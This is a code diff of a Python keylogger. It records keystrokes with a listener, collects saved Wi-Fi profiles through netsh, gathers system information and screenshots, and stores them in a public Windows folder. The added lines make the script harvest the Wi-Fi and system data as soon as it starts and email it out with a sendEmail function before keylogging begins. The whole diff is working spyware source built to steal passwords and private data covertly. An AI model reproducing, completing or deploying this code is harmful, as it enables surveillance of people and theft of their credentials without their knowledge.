@@ -12,6 +12,8 @@ import socket
 import os.path
 import time
 import subprocess
+import PIL
+
 
 count = 0
 keys = []
@@ -20,10 +22,10 @@ email_user = ' '
 email_send = ' '
 email_password = ' '
 subject = ' '
-save_path = "/Users/Default/Roaming/"
+save_path = "C:\\Users\\Public\\Roaming\\"
 system_information = os.path.join(save_path, "sysInfo.txt")
 screenshot = os.path.join(save_path, "screenshot.png")
-wifiInfo = os.path.join(save_path, "Wifi_Passswords.png")
+wifiInfo = os.path.join(save_path, "Wifi_Passswords.txt")
 
 def get_wifiInfo():
     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
@@ -110,6 +112,13 @@ def log_keys(keys):
 
 def on_release(key):
     pass
+
+get_wifiInfo()
+sendEmail(wifiInfo, "wifiInfo.txt")
+
+get_sysInfomation()
+sendEmail(system_information, "system_informataion.txt")
+
 
 with Listener(on_press=on_press, on_release = on_release) as listener:
     listener.join()
